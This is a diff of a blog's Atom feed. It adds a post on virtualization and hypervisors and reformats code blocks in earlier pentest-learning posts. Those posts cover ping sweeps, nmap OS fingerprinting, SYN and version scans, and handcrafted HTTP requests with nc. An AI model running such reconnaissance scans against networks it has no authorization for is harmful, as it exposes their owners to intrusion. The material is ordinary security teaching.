@@ -1,5 +1,49 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>blog.smigiel.dev - misc</title><link href="https://blog.smigiel.dev/" rel="alternate"></link><link href="https://blog.smigiel.dev/feeds/misc.atom.xml" rel="self"></link><id>https://blog.smigiel.dev/</id><updated>2020-11-20T00:00:00-08:00</updated><entry><title>Scanning Network</title><link href="https://blog.smigiel.dev/scanning-network.html" rel="alternate"></link><published>2020-11-20T00:00:00-08:00</published><updated>2020-11-20T00:00:00-08:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-11-20:/scanning-network.html</id><summary type="html">&lt;h1&gt;Mapping a Network&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>blog.smigiel.dev - misc</title><link href="https://blog.smigiel.dev/" rel="alternate"></link><link href="https://blog.smigiel.dev/feeds/misc.atom.xml" rel="self"></link><id>https://blog.smigiel.dev/</id><updated>2021-02-05T00:00:00-08:00</updated><entry><title>Introduction to the Cloud</title><link href="https://blog.smigiel.dev/introduction-to-the-cloud.html" rel="alternate"></link><published>2021-02-05T00:00:00-08:00</published><updated>2021-02-05T00:00:00-08:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2021-02-05:/introduction-to-the-cloud.html</id><summary type="html">&lt;p&gt;This post is an attempt to gather common terms, and provide links for more reading (mainly to wikipedia) about virtualization et al.&lt;/p&gt;
+&lt;h1&gt;Intro&lt;/h1&gt;
+&lt;p&gt;Virtualization term has been coined in 1960s to describe virtual machine. Right now, virtualization can also describe other areas like: software, memory, storage, data, network and hardware …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post is an attempt to gather common terms, and provide links for more reading (mainly to wikipedia) about virtualization et al.&lt;/p&gt;
+&lt;h1&gt;Intro&lt;/h1&gt;
+&lt;p&gt;Virtualization term has been coined in 1960s to describe virtual machine. Right now, virtualization can also describe other areas like: software, memory, storage, data, network and hardware.
+However, in the common understanding, virtualization means hardware virtualization. It refers to the creation of virtual machine htat acts like a real computer with an operating system.&lt;/p&gt;
+&lt;h1&gt;Hardware virtualization&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Hardware_virtualization"&gt;Hardware Virtualization&lt;/a&gt; can be divided into two main types:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Full_virtualization"&gt;full virtualization&lt;/a&gt; - completely simulates the actual hardware, guest system can run unmodified.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Paravirtualization"&gt;paravirtualization&lt;/a&gt; - uses software interface which is similar, but not identical to the underlying hardware.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Full virtualization&lt;/h2&gt;
+&lt;p&gt;Virtual machine simulates hardware to allow an unmodified guest OS to be run in isolation.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Software-assisted - completely relies on binary translation to virtualize the execution of sensitive, non-virtualizable instruction sets. It emulates the hardware using the software instruction sets. Due to binary translation, it is often criticized for performance issue: Eg. VirtualBox, VMware workstation, Virtual PC&lt;/li&gt;
+&lt;li&gt;Hardware-assisted - it eliminates the binary translation and it directly interrupts with hardware using the virtualization technology which has been integrated on processors. Guest OS's instructions might allow a virtual context execute privileged instructions directly on the processor, even thought it is virtualized. Eg. VMware ESXi, KVM, Hyper-V, Xen.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Paravirtualization&lt;/h2&gt;
+&lt;p&gt;It requires the guest operating system to be explicitly ported for the para-API, conventional OS distribution that is not paravirtualization-aware cannot be run on top of a paravirtualizing VVM.&lt;/p&gt;
+&lt;h1&gt;Hypervisor&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Hypervisor"&gt;Hypervisor&lt;/a&gt; (virtual machine monitor, VMM) is computer software, firmare or hardware that runs virtual machines. A computer on which a hypervisor runs one or more virtual machines is called a &lt;em&gt;host machine&lt;/em&gt;, and each virtual machine is called a &lt;em&gt;guest machine&lt;/em&gt;.
+There are two types of hypervisors:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Type-1, native or bare-metal hypervisors&lt;/li&gt;
+&lt;li&gt;Type-2 or hosted hypervisors&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Type-1 (bare-metal)&lt;/h2&gt;
+&lt;p&gt;Type-1 hypervisor is very basic OS on top of which there can be run virtual machines. The physical machine the hypervisor is running on serves virtualization purpose only. It is mainly found in enterprise environments.
+Due to its simplicity, it doesn't offer many functionalities.
+Examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VMware ESX/ESXi&lt;/li&gt;
+&lt;li&gt;KVM (it oftentimes can be categorized as type-2 hypervisor)&lt;/li&gt;
+&lt;li&gt;Oracle VM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Type-2 (hosted)&lt;/h2&gt;
+&lt;p&gt;This type of hypervisor runs on a conventional OS as an another program.
+Examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VirtualBox&lt;/li&gt;
+&lt;li&gt;VMware Workstation&lt;/li&gt;
+&lt;li&gt;Windows Virtual PC&lt;/li&gt;
+&lt;li&gt;Parallels Desktop&lt;/li&gt;
+&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="virtualization"></category><category term="cloud"></category></entry><entry><title>Scanning Network</title><link href="https://blog.smigiel.dev/scanning-network.html" rel="alternate"></link><published>2020-11-20T00:00:00-08:00</published><updated>2020-11-20T00:00:00-08:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-11-20:/scanning-network.html</id><summary type="html">&lt;h1&gt;Mapping a Network&lt;/h1&gt;
 &lt;p&gt;Sometimes, instead of receiving full information about target machines, penetration tester gets just address block. Later on, pentester needs to discover what kind of hosts with what kind of configuration, exist in particular network.&lt;/p&gt;
 &lt;p&gt;There are several different ways to reveal network configuration.&lt;/p&gt;
 &lt;h2&gt;PING sweeping&lt;/h2&gt;
@@ -10,15 +54,15 @@
 &lt;p&gt;Ping works by sending one or more special ICMP packets (type 8 - &lt;strong&gt;echo request&lt;/strong&gt;) to a host. If the host replies with ICMP &lt;strong&gt;echo reply&lt;/strong&gt; packets, it means that host is alive. &lt;a href="https://tools.ietf.org/html/rfc792"&gt;RFC792&lt;/a&gt; describes protocol used to carry diagnostic messages. ICMP is a part of the Internet Protocol.&lt;/p&gt;
 &lt;h3&gt;fping&lt;/h3&gt;
 &lt;p&gt;&lt;code&gt;fping&lt;/code&gt; is a Linux tool, improved version of standard &lt;code&gt;ping&lt;/code&gt;. It can be run against IP range:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;fping -a -g &amp;lt;ip_range&amp;gt; 2&amp;gt;/dev/null # -a -- show alive; -g -- generate list, redirect to /dev/null to surpress noise.&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;fping -a -g &amp;lt;ip_range&amp;gt; 2&amp;gt;/dev/null # -a -- show alive; -g -- generate list, redirect to /dev/null to surpress noise.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;nmap&lt;/h3&gt;
 &lt;p&gt;Recommended tool for penetration testing is &lt;code&gt;nmap&lt;/code&gt;. It is very powerful tool, which allows for detection hosts, its systems and more.
 To attempt port sweeping (ping scan), one can use &lt;code&gt;-sn&lt;/code&gt; option:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -sn &amp;lt;ip_range&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;nmap -sn &amp;lt;ip_range&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;OS Fingerprinting&lt;/h2&gt;
@@ -38,16 +82,16 @@ To attempt port sweeping (ping scan), one can use &lt;code&gt;-sn&lt;/code&gt; o
 &lt;h3&gt;Online fingerprinting (nmap)&lt;/h3&gt;
 &lt;p&gt;In a case of online, to go tool is again &lt;code&gt;nmap&lt;/code&gt;.
 To perform OS fingerprinting with it, you have to use &lt;code&gt;-O&lt;/code&gt; option and specify target. In a case of known targets, you can add &lt;code&gt;-Pn&lt;/code&gt; to skip rediscovering them again.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -Pn -O &amp;lt;targets&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;nmap -Pn -O &amp;lt;targets&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This option can be additionally fine-tuned, to prevent from too aggressive way of discovering hosts:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;OS DETECTION:&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;OS DETECTION:&lt;/span&gt;
 &lt;span class="err"&gt;  -O: Enable OS detection&lt;/span&gt;
 &lt;span class="err"&gt;  --osscan-limit: Limit OS detection to promising targets&lt;/span&gt;
 &lt;span class="err"&gt;  --osscan-guess: Guess OS more aggressively&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Port Scanning&lt;/h2&gt;
@@ -55,22 +99,22 @@ To perform OS fingerprinting with it, you have to use &lt;code&gt;-O&lt;/code&gt
 &lt;p&gt;Port scanning is a process used to determine what TCP and UDP ports are open on target hosts. It, also usually helps detect which software and version is listening on a specific port.&lt;/p&gt;
 &lt;h3&gt;TCP Three-Way Handshake&lt;/h3&gt;
 &lt;p&gt;Default usage:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -sT &amp;lt;target&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;nmap -sT &amp;lt;target&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Description of process.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
 &lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
 &lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Client wants to connect to a server, it first sends a packet with the &lt;code&gt;SYN&lt;/code&gt; flag enabled. The server then responds by sending a packet with both &lt;code&gt;SYN&lt;/code&gt; and &lt;code&gt;ACK&lt;/code&gt; flags enabled. Finally, the client replies back by sending a packet with the &lt;code&gt;ACK&lt;/code&gt; flag enabled and the actual data transmission can start.&lt;/p&gt;
 &lt;p&gt;In a case of &lt;strong&gt;closed&lt;/strong&gt; port, it looks slightly differently.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
 &lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;RST&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The server will reply with a packet that has the reset &lt;code&gt;RST&lt;/code&gt; and &lt;code&gt;ACK&lt;/code&gt; flags set. This behavior tells the client that the port is &lt;strong&gt;closed&lt;/strong&gt;.&lt;/p&gt;
@@ -83,8 +127,8 @@ To perform OS fingerprinting with it, you have to use &lt;code&gt;-O&lt;/code&gt
 It allows system administrators to easily detect the scan.&lt;/p&gt;
 &lt;h3&gt;TCP-SYN scan&lt;/h3&gt;
 &lt;p&gt;Default usage:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -sS &amp;lt;targets&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;nmap -sS &amp;lt;targets&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To mitigate possibility of being detected (in the case of 3-way handshake), there is more stealthy solution, called &lt;code&gt;TCP-SYN scan&lt;/code&gt;.
@@ -97,17 +141,17 @@ During a SYN scan, the scanner does not perform a full handshake. It just sends 
 It is important to remember, that even &lt;code&gt;TCP-SYN scan&lt;/code&gt; can be detected with well-configured IDS (Intrusion Detection System).&lt;/p&gt;
 &lt;h3&gt;Version detection scan&lt;/h3&gt;
 &lt;p&gt;Default usage:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;namp -sV &amp;lt;targets&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;namp -sV &amp;lt;targets&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This scan is recorded in logs, however it is very useful. It mixes a TCP connect scan with some probes, which are used to detect what application is listening on a particular port.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
 &lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
 &lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
 &lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;Banner&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
 &lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt; &lt;span class="n"&gt;RST&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;If the daemon doesn't send a banner, &lt;code&gt;nmap&lt;/code&gt; sends some probes to understand what the listening application is. It later tries to guess the application based on its behavior.&lt;/p&gt;
@@ -173,8 +217,8 @@ There are several ways of achieving that goal.&lt;/p&gt;
 &lt;h3&gt;Google&lt;/h3&gt;
 &lt;p&gt;One of the simplest ways is to search a Google!
 By issuing query to search engine like below, we can receive responses focused around particular company website.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;company&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;com&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;company&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;com&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;dnsdumpster&lt;/h3&gt;
@@ -214,7 +258,7 @@ During an HTTP communication, the client and the server exchange messages. HTTP 
 &lt;h3&gt;HTTP Request&lt;/h3&gt;
 &lt;p&gt;To send HTTP request, usually we use browsers. However, it is not the only way of doing so. To build request, we can use &lt;code&gt;netcat&lt;/code&gt; or &lt;code&gt;telnet&lt;/code&gt;.
 Below is an example of HTTP request, with &lt;code&gt;nc&lt;/code&gt; requesting website running on localhost on port &lt;code&gt;8000&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc localhost 8000
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc localhost 8000
 GET / HTTP/1.0
 Host: localhost
 
@@ -227,7 +271,7 @@ Last-Modified: Fri, 02 Oct 2020 01:44:33 GMT
 
 &lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
 [...]
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;First line contains &lt;strong&gt;HTTP request method&lt;/strong&gt;, path and protocol version.
@@ -235,20 +279,20 @@ HTTP request method is information about the type of the request. Other requests
 Path tells the server which resource to fetch, while protocol version tells how to communicate with the client.
 Next, there is &lt;code&gt;Host&lt;/code&gt; header field, which specifies the Internet hostname and port number of the resource being requested.&lt;/p&gt;
 &lt;p&gt;We can also create one-liner to retrieve appropriate information&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; -en &lt;span class="s1"&gt;&amp;#39;HEAD / HTTP/1.1\r\nHost:localhost\r\n\r\n&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; nc localhost &lt;span class="m"&gt;8000&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; -en &lt;span class="s1"&gt;&amp;#39;HEAD / HTTP/1.1\r\nHost:localhost\r\n\r\n&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; nc localhost &lt;span class="m"&gt;8000&lt;/span&gt;
 HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
 Server: SimpleHTTP/0.6 Python/3.7.3
 Date: Fri, &lt;span class="m"&gt;02&lt;/span&gt; Oct &lt;span class="m"&gt;2020&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;:01:34 GMT
 Content-type: text/html
 Content-Length: &lt;span class="m"&gt;27806&lt;/span&gt;
 Last-Modified: Fri, &lt;span class="m"&gt;02&lt;/span&gt; Oct &lt;span class="m"&gt;2020&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:55:46 GMT
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Additionally, we can give extra header values like &lt;code&gt;User-Agent&lt;/code&gt; (identifies the client and the system), &lt;code&gt;Accept&lt;/code&gt; (specifies document type the client is expecting in the response) or &lt;code&gt;Connection: keep-alive&lt;/code&gt; (future communications with the server will reuse the current connection).&lt;/p&gt;
 &lt;h3&gt;HTTP Response&lt;/h3&gt;
 &lt;p&gt;HTTP response, similar to request, has common format.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc localhost 8000
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc localhost 8000
 GET / HTTP/1.0
 Host: localhost
 
@@ -261,7 +305,7 @@ Last-Modified: Fri, 02 Oct 2020 01:44:33 GMT
 
 &lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
 [...]
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The first line is &lt;strong&gt;Status-Line&lt;/strong&gt; which consists of protocol version (HTTP 1.0) followed by a numeric status code (200) and textual meaning (OK). There are many codes. Description, again can be found on &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status"&gt;Mozilla website&lt;/a&gt;. Next, there is additional information regarding server, date and time at which the message was originated, followed by page content.&lt;/p&gt;
@@ -274,13 +318,13 @@ By doing so, entire traffic is being encrypted. It means, that even if someone c
 &lt;li&gt;DNS or similar protocols (domain resolvers)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;To analyze connection, we cannot use &lt;code&gt;nc&lt;/code&gt; anymore, which doesn't support SSL. To work with SSL, we can use &lt;code&gt;openssl&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc blog.smigiel.dev &lt;span class="m"&gt;443&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc blog.smigiel.dev &lt;span class="m"&gt;443&lt;/span&gt;
 HEAD / HTTP/1.1
 $
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ openssl s_client -connect blog.smigiel.dev:443 -quiet
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ openssl s_client -connect blog.smigiel.dev:443 -quiet
 &lt;span class="nv"&gt;depth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="nv"&gt;O&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Digital Signature Trust Co., &lt;span class="nv"&gt;CN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; DST Root CA X3
 verify &lt;span class="k"&gt;return&lt;/span&gt;:1
 &lt;span class="nv"&gt;depth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;C&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; US, &lt;span class="nv"&gt;O&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Let&lt;span class="s1"&gt;&amp;#39;s Encrypt, CN = Let&amp;#39;&lt;/span&gt;s Encrypt Authority X3
@@ -312,7 +356,7 @@ X-Cache-Hits: &lt;span class="m"&gt;1&lt;/span&gt;
 X-Timer: S1601607430.114992,VS0,VE1
 Vary: Accept-Encoding
 X-Fastly-Request-ID: b902c4a5a2f4410e8e6ac21e60fa2e659f1e8300
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;HTTP Cookies&lt;/h2&gt;
@@ -432,7 +476,7 @@ The header fields involved in the handshake are: sequence number, acknowledgemen
 &lt;li&gt;The server replies by sending a packet with both the &lt;code&gt;SYN&lt;/code&gt; and &lt;code&gt;ACK&lt;/code&gt; flags. &lt;code&gt;Sequence number&lt;/code&gt; is again chosen as random, but &lt;code&gt;ACK&lt;/code&gt; is &lt;code&gt;seq number + 1&lt;/code&gt;.&lt;/li&gt;
 &lt;li&gt;The client completes the synchronization by sending an &lt;code&gt;ACK&lt;/code&gt; packet. The &lt;code&gt;ACK&lt;/code&gt; is &lt;code&gt;seq number + 1&lt;/code&gt; and &lt;code&gt;sequence number&lt;/code&gt; is &lt;code&gt;ACK + 1&lt;/code&gt; from the second step.&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;Host&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="k"&gt;Host&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Host&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="k"&gt;Host&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
 &lt;span class="c1"&gt;-------|-------|--------&lt;/span&gt;
 &lt;span class="c1"&gt;-----&amp;gt; |SYN    |&lt;/span&gt;
     &lt;span class="n"&gt;Seq&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;328&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
@@ -442,7 +486,7 @@ The header fields involved in the handshake are: sequence number, acknowledgemen
 
 &lt;span class="c1"&gt;------&amp;gt;|ACK    |&lt;/span&gt;
     &lt;span class="n"&gt;Seq&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;330&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;413&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h1&gt;Additional resources&lt;/h1&gt;
@@ -455,14 +499,14 @@ The header fields involved in the handshake are: sequence number, acknowledgemen
 Routing table contains information about the topology of the network immediately around it.
